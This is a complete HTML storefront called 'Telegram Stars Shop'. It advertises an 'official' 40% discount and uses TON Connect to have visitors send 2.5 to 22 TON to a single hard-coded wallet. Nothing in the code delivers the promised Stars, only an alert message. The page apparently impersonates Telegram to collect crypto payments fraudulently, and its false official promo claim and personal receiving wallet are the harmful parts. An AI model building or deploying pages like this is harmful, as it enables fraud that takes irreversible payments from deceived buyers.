<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stars Store</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0b0b0b; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        header { text-align: center; margin-bottom: 30px; }
        h1 { color: #f7d54e; font-size: 24px; margin-bottom: 5px; }
        .subtitle { color: #888; font-size: 14px; }
        
        .packages-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; gap: 15px; }
        .package-card { background: #1a1a1a; border: 1px solid #333; border-radius: 15px; padding: 20px; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
        .package-card:hover { border-color: #00d4ff; background: #222; }
        
        .info { text-align: left; }
        .stars-count { font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 8px; }
        .old-price { font-size: 12px; color: #666; text-decoration: line-through; }
        
        .price-tag { color: #00d4ff; font-weight: bold; font-size: 16px; text-align: right; }
        .buy-btn { background: #0088cc; color: white; border: none; padding: 8px 15px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 5px; }
        
        #ton-connect-button { margin-top: 20px; display: none; } /* مخفي ويظهر عند الدفع */
        .footer-note { margin-top: 40px; font-size: 10px; color: #444; }
    </style>
</head>
<body>

    <header>
        <div style="font-size: 50px;">⭐️</div>
        <h1>Telegram Stars Shop</h1>
        <p class="subtitle">Official Community Promo - 40% OFF</p>
    </header>

    <div class="packages-container">
        <div class="package-card">
            <div class="info">
                <div class="stars-count">1,000 Stars</div>
                <div class="old-price">$25.00</div>
                <button class="buy-btn" onclick="pay(2.5, '1K')">Buy Now</button>
            </div>
            <div class="price-tag">2.5 TON</div>
        </div>

        <div class="package-card" style="border-color: #f7d54e;">
            <div class="info">
                <div class="stars-count">5,000 Stars <span style="font-size: 10px; background: #f7d54e; color: black; padding: 2px 5px; border-radius: 5px; margin-left: 5px;">BEST</span></div>
                <div class="old-price">$125.00</div>
                <button class="buy-btn" style="background: #f7d54e; color: black;" onclick="pay(12, '5K')">Buy Now</button>
            </div>
            <div class="price-tag">12 TON</div>
        </div>

        <div class="package-card">
            <div class="info">
                <div class="stars-count">10,000 Stars</div>
                <div class="old-price">$250.00</div>
                <button class="buy-btn" onclick="pay(22, '10K')">Buy Now</button>
            </div>
            <div class="price-tag">22 TON</div>
        </div>
    </div>

    <div id="ton-connect-button"></div>
    <p class="footer-note">Secure Payment via TON Connect 2.0</p>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        async function pay(amountInTon, label) {
            // تحويل المبلغ لصيغة النانو تون (NanoTON)
            const amount = (amountInTon * 1000000000).toString();
            
            // إذا لم تكن المحفظة متصلة، نطلب الاتصال أولاً
            if (!tonConnectUI.connected) {
                await tonConnectUI.openModal();
            }

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [{
                    address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك
                    amount: amount,
                    payload: btoa("Purchase Stars " + label) // رسالة تظهر في المحفظة
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("Payment sent! Stars will be added to your account after confirmation.");
            } catch (e) {
                console.error(e);
            }
        }
    </script>
</body>
</html>
